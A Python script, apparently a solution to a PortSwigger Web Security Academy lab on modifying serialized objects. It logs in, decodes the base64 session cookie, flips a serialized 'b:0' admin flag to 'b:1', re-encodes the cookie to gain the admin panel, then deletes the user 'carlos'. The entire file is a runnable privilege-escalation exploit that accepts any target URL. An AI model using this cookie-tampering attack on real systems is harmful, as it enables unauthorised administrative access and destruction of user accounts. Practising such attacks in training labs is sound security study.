# Web Security Academy Port Swigger
# Deserialization - Modifying serialized objects
#
import requests
import sys
import argparse
import urllib.parse
from base64 import b64encode, b64decode
from requests.sessions import Session


parser = argparse.ArgumentParser()
parser.add_argument('--target', metavar='<target url>', required=True, type=str)
parser.add_argument('--user', metavar='<username>', required=True, type=str)
parser.add_argument('--password', metavar='<password>', required=True, type=str)
args = parser.parse_args()

auth_failed = 'Invalid username or password'
login_panel = "/login"
admin_panel = "Admin panel"
delete_panel = "/admin/delete?username=carlos"

creds = {
        'username': args.user,
        'password': args.password
}


session = requests.Session()

print(f'Logging as user: \'{args.user}\':', end=' ') 
response = session.post(args.target + login_panel, data=creds)
if auth_failed in response.text:
    print('Failed')
    sys.exit(-1)

print('Success')

print('Deserialization proccess:', end=' ')
try:
    serialized_data = urllib.parse.unquote(session.cookies.get_dict()['session'])
    decoded_cookie = b64decode(serialized_data).decode('utf-8')
    admin_cookie = bytes(decoded_cookie.replace('b:0', 'b:1', 1), 'utf-8')
    session.cookies.set('session', b64encode(admin_cookie).decode('utf-8'),
                        domain='web-security-academy.net')
except Exception:
    print('Failed')
    sys.exit(-1)
else:
    print('Success')

print('Gaining Admin privilages:', end=' ')
response = session.get(args.target)
if admin_panel not in response.text:
    print('Failed')
    sys.exit(-1)

print('Success')

print('Removing \'carlos\' account:', end=' ')
response = session.get(args.target + delete_panel)
if response.status_code == 200:
    print('Success')
else:
    print('Failed')

session.close()
